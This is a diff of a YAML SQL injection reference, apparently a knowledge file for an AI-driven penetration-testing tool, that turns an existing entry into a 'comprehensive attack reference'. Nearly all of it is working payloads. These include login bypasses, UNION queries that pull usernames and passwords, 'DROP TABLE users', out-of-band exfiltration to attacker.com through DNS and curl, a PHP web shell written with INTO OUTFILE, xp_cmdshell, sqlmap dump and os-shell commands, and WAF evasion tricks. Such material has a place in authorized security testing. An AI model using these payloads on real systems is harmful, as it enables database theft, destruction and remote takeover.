@@ -1,144 +1,145 @@
 id: SQLI
-name: SQL Injection
+name: SQL Injection — Comprehensive Attack Reference
 cwe:
 - CWE-89
 owasp: A03:2021 Injection
 severity_range: High - Critical
-description: User input is incorporated into SQL queries without proper sanitization, allowing attackers to read, modify,
-  or delete database contents, bypass authentication, or execute OS commands.
+description: 'SQL injection occurs when user input is interpolated into SQL queries without parameterization. Five major detection
+  classes: error-based, boolean blind, time-based blind, UNION-based, and out-of-band (OOB). Modern SQLi often requires WAF
+  bypass techniques and DB-specific syntax.'
 detection:
-  payloads:
-    error_based:
-    - ''''
-    - ''''''
-    - '"'
-    - \
-    - ''' OR ''1''=''1'
-    - '" OR "1"="1'
-    - ''' OR ''1''=''1'' --'
-    - ''' OR ''1''=''1'' #'
-    - ''' OR ''1''=''1''/*'
-    - ''') OR (''1''=''1'
-    - ''')) OR ((''1''=''1'
-    - 1' ORDER BY 1--+
-    - 1' ORDER BY 10--+
-    - ''' AND 1=CONVERT(int,@@version)--'
-    - ''' AND 1=1--'
-    - ''' AND 1=2--'
-    - ''' UNION SELECT NULL--'
-    - ''' UNION SELECT NULL,NULL--'
-    - ''' UNION SELECT NULL,NULL,NULL--'
-    blind_boolean:
-    - ''' AND 1=1--'
-    - ''' AND 1=2--'
-    - ''' AND ''a''=''a'
-    - ''' AND ''a''=''b'
-    - ''' AND SUBSTRING(@@version,1,1)=''5''--'
-    - 1 AND 1=1
-    - 1 AND 1=2
-    - ''' AND (SELECT COUNT(*) FROM information_schema.tables)>0--'
-    blind_time:
-    - '''; WAITFOR DELAY ''0:0:5''--'
-    - ''' AND SLEEP(5)--'
-    - ''' AND pg_sleep(5)--'
-    - '''; SELECT pg_sleep(5)--'
-    - 1; WAITFOR DELAY '0:0:5'--
-    - ''' OR SLEEP(5)#'
-    - ''' AND BENCHMARK(5000000,SHA1(''test''))--'
-    - 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
-    union_based:
-    - ''' UNION SELECT NULL--'
-    - ''' UNION SELECT NULL,NULL--'
-    - ''' UNION SELECT NULL,NULL,NULL--'
-    - ''' UNION SELECT 1,2,3--'
-    - ''' UNION SELECT username,password FROM users--'
-    - ''' UNION ALL SELECT NULL,NULL,NULL--'
-    - 0 UNION SELECT 1,2,3--
-    stacked_queries:
-    - '''; DROP TABLE test--'
-    - '''; INSERT INTO logs VALUES(''pwned'')--'
-    - '''; EXEC xp_cmdshell(''whoami'')--'
-    out_of_band:
-    - ''' AND 1=(SELECT LOAD_FILE(CONCAT(''\\\\'',@@version,''.attacker.com\\a'')))--'
-    - '''; EXEC master..xp_dirtree ''\\\\attacker.com\\a''--'
-  error_signatures:
-  - you have an error in your sql syntax
-  - unclosed quotation mark
-  - quoted string not properly terminated
-  - mysql_fetch
-  - mysql_num_rows
-  - mysql_query
-  - pg_query
-  - pg_exec
-  - pg_fetch
-  - sqlite3.operationalerror
-  - sqlite3.warning
-  - microsoft ole db provider for sql server
-  - microsoft odbc sql server driver
-  - ora-01756
-  - ora-00933
-  - ora-00907
-  - sql command not properly ended
-  - invalid query
-  - syntax error
-  - unterminated string
-  - division by zero
-  - sqlstate
-  - jdbc
-  - odbc
+  prerequisites:
+  - Identify endpoints with parameters that interact with a database
+  - Establish baseline response (size, status, content)
+  - Identify the database engine via error messages or behavior fingerprinting
   strategy:
-  - 1. Identify all input points (GET/POST params, cookies, headers, JSON fields)
-  - 2. Test each with a single quote (') and observe error vs normal response
-  - '3. Compare responses for boolean-based: AND 1=1 vs AND 1=2'
-  - '4. If no visible difference, try time-based: SLEEP(5) or WAITFOR DELAY'
-  - 5. Determine column count with ORDER BY incrementing
-  - 6. Use UNION SELECT to extract data once column count is known
-  - 7. Extract database version, current user, database name first
-  - 8. Enumerate tables via information_schema.tables
-  - 9. Extract sensitive data (credentials, PII, tokens)
-  - 10. Test for stacked queries and OS command execution if DBMS supports it
-escalation:
+  - 1. Test for syntax errors with quotes (' " `) and backslashes
+  - 2. If errors appear, identify DB engine from error message patterns
+  - 3. Confirm via boolean differential (AND 1=1 vs AND 1=2)
+  - 4. Try time-based payloads if no visible output (SLEEP, WAITFOR, pg_sleep)
+  - 5. Attempt UNION-based extraction (column count via ORDER BY, then NULL probes)
+  - 6. For non-printable scenarios, use OOB exfiltration via DNS/HTTP
+  - '7. Test WAF bypasses: comment injection, case variation, encoding, alternative keywords'
+  - 8. For stored/second-order, submit payload to one endpoint and check execution at another
+  payloads:
+  - ''''
+  - '"'
+  - '`'
+  - \
+  - ''' OR ''1''=''1'
+  - ''' OR ''1''=''1''-- '
+  - '" OR "1"="1'
+  - '1'' AND 1=1-- '
+  - '1'' AND 1=2-- '
+  - ''' UNION SELECT NULL-- '
+  - ''' UNION SELECT NULL,NULL-- '
+  - '1'' AND SLEEP(5)-- '
+  - '1''; WAITFOR DELAY ''0:0:5''-- '
+  - '1'' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- '
+  - '1'' AND pg_sleep(5)-- '
+  - 'admin''-- '
+  - admin'/*
+  - 'admin'' #'
+  - '''; DROP TABLE users-- '
+  - '''/**/AND/**/1=1-- '
+  - '''%20AND%201=1-- '
+  attack_classes:
+    error_based:
+      description: Database error in response reveals query structure or data via crafted error messages.
+      techniques:
+      - 'MySQL: extractvalue(1, concat(0x7e, (SELECT version())))'
+      - 'MSSQL: convert(int, (SELECT TOP 1 name FROM sys.tables))'
+      - 'PostgreSQL: cast((SELECT version()) as numeric)'
+      - 'Oracle: utl_inaddr.get_host_name((SELECT user FROM dual))'
+      severity: high
+    boolean_blind:
+      description: TRUE/FALSE conditions produce different responses, enabling 1-bit-at-a-time extraction.
+      techniques:
+      - AND SUBSTRING(@@version, 1, 1) = '5'
+      - AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) > 64
+      - AND (SELECT COUNT(*) FROM users WHERE password LIKE 'a%') > 0
+      severity: critical
+    time_based_blind:
+      description: Conditional SLEEP/delay enables 1-bit extraction when no visible response differs.
+      techniques:
+      - 'MySQL: IF((SELECT SUBSTRING(version(),1,1))=''5'', SLEEP(5), 0)'
+      - 'PostgreSQL: SELECT CASE WHEN (...) THEN pg_sleep(5) ELSE 0 END'
+      - 'MSSQL: IF (...) WAITFOR DELAY ''0:0:5'''
+      - 'Oracle: SELECT CASE WHEN (...) THEN DBMS_PIPE.RECEIVE_MESSAGE(''a'', 5) ELSE 1 END FROM DUAL'
+      severity: critical
+    union_based:
+      description: UNION SELECT injects additional rows into the response, allowing data extraction from any table.
+      techniques:
+      - 'Determine column count: ORDER BY 1,2,3...'
+      - 'Identify printable columns: UNION SELECT ''a'',''b'',''c'',...'
+      - 'Extract: UNION SELECT username, password, NULL FROM users'
+      - 'Concatenation: UNION SELECT CONCAT(username,'':'',password) FROM users'
+      severity: critical
+    out_of_band_oob:
+      description: Exfiltrate data via DNS/HTTP callbacks when neither visible response nor timing works.
+      techniques:
+      - 'MySQL DNS: AND (SELECT LOAD_FILE(CONCAT(''\\\\'', (SELECT user()), ''.attacker.com\\a'')))'
+      - 'MSSQL DNS: EXEC master..xp_dirtree ''\\\\$(query).attacker.com\\a'''
+      - 'Oracle HTTP: SELECT UTL_HTTP.REQUEST(''http://attacker.com/?d=''||user) FROM DUAL'
+      - 'PostgreSQL: COPY (SELECT '''') TO PROGRAM ''curl attacker.com/$(query)'''
+      severity: critical
+    second_order:
+      description: Payload stored in one endpoint executes when read by another endpoint.
+      techniques:
+      - Submit ' OR 1=1-- as username during signup
+      - Login triggers SQLi when the stored username is used in a query
+      - Search uses ' OR 1=1 from profile field — admin viewing profile triggers it
+      severity: high
+exploitation:
   data_extraction:
-  - Extract @@version / version() to identify DBMS
-  - Extract current_user() / user() / SYSTEM_USER
-  - Extract database() / current_database()
-  - Enumerate information_schema.tables and information_schema.columns
-  - Extract credentials from users/accounts tables
-  - Look for API keys, tokens, secrets in config tables
-  authentication_bypass:
-  - ''' OR ''1''=''1'' -- (classic bypass)'
-  - admin'-- (bypass password check for known username)
-  - ''' OR 1=1 LIMIT 1-- (login as first user, usually admin)'
-  os_command_execution:
-    mysql: ''' UNION SELECT ''<?php system($_GET["cmd"]); ?>'' INTO OUTFILE ''/var/www/html/shell.php''--'
-    mssql: '''; EXEC xp_cmdshell(''whoami'')--'
-    postgresql: '''; COPY (SELECT '''') TO PROGRAM ''whoami''--'
-  file_read:
-    mysql: ''' UNION SELECT LOAD_FILE(''/etc/passwd'')--'
-    postgresql: ''' UNION SELECT pg_read_file(''/etc/passwd'',0,1000)--'
-waf_bypass:
-- 'Use URL encoding: %27 for single quote'
-- 'Double URL encoding: %2527'
-- 'Use comments: /*!UNION*/ /*!SELECT*/'
-- 'Case variation: uNiOn SeLeCt'
-- 'Use CHAR(): CHAR(39) for single quote'
-- 'Newline injection: %0A between keywords'
-- 'Use /**/ instead of spaces: UNION/**/SELECT'
-- JSON-based injection for JSON input fields
-- HPP (HTTP Parameter Pollution) for param-based WAFs
-evidence_needed: Database error with query fragment, data extraction via UNION, or time delay confirming blind injection
-tools:
-- http_request
-- record_finding
+  - 'Once injection confirmed, enumerate DB schema:'
+  - 'MySQL: SELECT table_name FROM information_schema.tables WHERE table_schema=database()'
+  - 'PostgreSQL: SELECT table_name FROM information_schema.tables WHERE table_schema=''public'''
+  - 'MSSQL: SELECT name FROM sys.tables'
+  - Extract sensitive tables (users, sessions, credit_cards, secrets)
+  privilege_escalation:
+  - 'Check current user privileges: SELECT user(), current_user, system_user'
+  - 'Try to read files: SELECT LOAD_FILE(''/etc/passwd'') (MySQL with FILE priv)'
+  - 'Try to write files: SELECT ''shell'' INTO OUTFILE ''/var/www/shell.php'' (RCE if web root writable)'
+  - 'PostgreSQL: COPY FROM PROGRAM (PostgreSQL 9.3+, superuser only) for direct RCE'
+  - 'MSSQL: xp_cmdshell ''whoami'' (if sysadmin and feature enabled)'
+  - 'Oracle: PL/SQL injection via DBMS_XMLQUERY for arbitrary query execution'
+  automated_tools:
+  - sqlmap -u 'https://target/page?id=1' --batch --dbs
+  - sqlmap -u '...' --batch --dump-all (full DB dump)
+  - sqlmap -u '...' --os-shell (RCE if privileges allow)
+  - sqlmap with --tamper for WAF bypass
+waf_bypasses:
+- 'Inline comments: SEL/**/ECT, UNION/*!*/SELECT'
+- 'Case variation: SeLeCt, UnIoN'
+- 'URL encoding: %53%45%4c%45%43%54 for SELECT'
+- 'Double encoding: %253%2553%2545LECT'
+- 'Unicode: \u0053ELECT, \x53ELECT'
+- 'Alternative keywords: && instead of AND, || instead of OR, // instead of --'
+- 'Concat string functions: CHR(83)||CHR(69)... or 0x53454c454354'
+- 'Conditional comments: /*!50000SELECT*/ (MySQL-specific)'
+- 'Buffer overflow WAFs: send 10KB of junk before payload'
+- 'HTTP Parameter Pollution: id=1&id='' UNION SELECT...'
+- 'Sleep alternatives if SLEEP is blocked: BENCHMARK, GET_LOCK, regex bombs'
 ai_research_hints:
-- Check if the application uses an ORM and test ORM-specific injection patterns
-- Test JSON/XML input fields for second-order injection
-- Check for NoSQL injection if MongoDB indicators present
-- Test stored procedures for injection if MSSQL detected
-- Look for batch/bulk import endpoints that may bypass parameterization
+- If only SQLi is suspected but no error appears, check application logs reachable via LFI for raw SQL errors
+- Test in different HTTP methods — sometimes POST bypasses GET-only WAFs
+- Check Content-Type variations — JSON SQLi often bypasses form-aware WAFs
+- Stored procedures may have separate parameterization — test EXEC/CALL endpoints
+- ORM queries via .raw() or .annotate() with user input are common backdoors in 'safe' apps
+- Second-order SQLi often hides in admin panels, report generators, or batch jobs
+evidence_needed: '1. Reproducible response differential between TRUE and FALSE conditions, OR
+
+  2. Successful data extraction via UNION/error/OOB, OR
+
+  3. Confirmed RCE via file write or xp_cmdshell'
+tools:
+- sqlmap
+- ghauri
+- http_request
+- OOB callback server
 references:
 - https://portswigger.net/web-security/sql-injection
 - https://owasp.org/www-community/attacks/SQL_Injection
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
-- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
-- https://hackerone.com/hacktivity?type=team&querystring=sql%20injection
+- https://book.hacktricks.xyz/pentesting-web/sql-injection
